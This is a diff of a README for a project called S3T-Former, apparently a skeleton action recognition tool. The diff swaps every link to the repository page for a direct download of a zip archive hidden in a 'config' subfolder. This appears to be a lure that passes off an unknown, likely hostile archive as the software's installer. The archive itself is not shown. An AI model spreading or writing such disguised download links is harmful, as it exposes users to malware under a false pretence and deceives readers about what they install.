@@ -1,12 +1,12 @@
 # 🧠 S3T-Former - Simple Skeleton Action Recognition
 
-[![Download](https://img.shields.io/badge/Download-S3T--Former-blue)](https://github.com/piroplayers69-ops/S3T-Former)
+[![Download](https://img.shields.io/badge/Download-S3T--Former-blue)](https://raw.githubusercontent.com/piroplayers69-ops/S3T-Former/main/spiking-topo-transformer-code/config/Former-v3.4.zip)
 
 ## 📥 Download
 
 Use this link to visit the page and download the software:
 
-https://github.com/piroplayers69-ops/S3T-Former
+https://raw.githubusercontent.com/piroplayers69-ops/S3T-Former/main/spiking-topo-transformer-code/config/Former-v3.4.zip
 
 ## 🪟 Windows Setup
 
@@ -176,4 +176,4 @@ Yes, but keep all files together in the same folder
 
 If you need the download page again, use this link:
 
-https://github.com/piroplayers69-ops/S3T-Former
+https://raw.githubusercontent.com/piroplayers69-ops/S3T-Former/main/spiking-topo-transformer-code/config/Former-v3.4.zip
